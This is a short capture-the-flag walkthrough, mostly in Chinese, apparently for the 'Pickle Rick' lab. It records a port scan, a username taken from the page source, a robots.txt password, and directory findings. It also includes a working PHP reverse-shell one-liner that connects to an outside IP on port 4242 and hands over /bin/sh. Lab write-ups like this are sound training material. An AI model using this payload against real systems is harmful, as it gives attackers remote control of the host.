#开启服务
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


#网页源代码信息
Note to self, remember username!

Username: R1ckRul3s


#目录爆破
1，assets
2, robots.txt---->   Wubbalubbadubdub   Wubba lubba dub dub
在Rick and Morty中Rick有一句口头禅“Wubba lubba dub dub”，在鸟人语言里，这是“我很痛苦，请救救我”的意思
3,login.php 登录页面

#clue.txt
Look around the file system for the other ingredient.

#其他文件夹
backups
cache
crash
lib
local
lock
log
mail
opt
run
snap
spool
tmp
www

#交互shell
php -r '$sock=fsockopen("10.13.21.169",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'


cat "second ingredients"